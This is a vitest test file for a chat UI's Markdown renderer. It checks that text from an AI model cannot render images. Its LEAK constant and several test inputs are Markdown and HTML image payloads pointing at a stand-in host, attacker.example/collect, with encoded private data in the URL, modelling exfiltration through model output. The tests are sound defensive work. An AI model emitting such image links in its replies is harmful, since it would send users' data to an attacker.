import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";
import { describe, expect, it } from "vitest";
import {
  imagePlaceholder,
  SAFE_COMPONENTS,
  SAFE_REHYPE_PLUGINS,
} from "../../../web/src/lib/markdown.js";

// The reply and reasoning renderers (MessageResponse, ReasoningContent) pass
// these to Streamdown. Rendering here is the same React tree without the DOM.
function render(markdown: string, safe = true): string {
  return renderToStaticMarkup(
    createElement(
      Streamdown,
      {
        controls: false,
        lineNumbers: false,
        ...(safe ? { components: SAFE_COMPONENTS, rehypePlugins: SAFE_REHYPE_PLUGINS } : {}),
      },
      markdown,
    ),
  );
}

const LEAK = "https://attacker.example/collect?d=Kestrel%20owes%20%2412%2C400";

describe("model text as Markdown", () => {
  it("renders Streamdown's defaults with the remote image (why this module exists)", () => {
    expect(render(`![status](${LEAK})`, false)).toContain(`src="${LEAK}"`);
  });

  it.each([
    [`![status](${LEAK})`],
    [`Status: ![](${LEAK}) done`],
    [`<img src="${LEAK}" alt="status">`],
    [`<p>badge <img src="${LEAK}"></p>`],
    ["![pixel](data:image/png;base64,iVBORw0KGgo=)"],
    [`[![badge](${LEAK})](https://example.test)`],
  ])("never renders an image element for %s", (markdown) => {
    const html = render(markdown);
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain("attacker.example/collect");
    expect(html).not.toContain("data:image");
  });

  it("shows an image's alt text instead, and keeps text and links", () => {
    const html = render(
      `Overdue: **3 invoices**. ![status badge](${LEAK}) [Open](https://example.test)`,
    );
    expect(html).toContain("3 invoices");
    // The alt text stays readable; links stay (Streamdown asks before opening one).
    expect(html).toContain("status badge");
    expect(html).toMatch(/data-streamdown="link"[^>]*>Open</);
    expect(html).not.toMatch(/<img\b/i);
    expect(imagePlaceholder("status badge")).toBe("[image: status badge]");
    expect(imagePlaceholder("  ")).toBe("[image]");
    expect(imagePlaceholder(undefined)).toBe("[image]");
  });
});
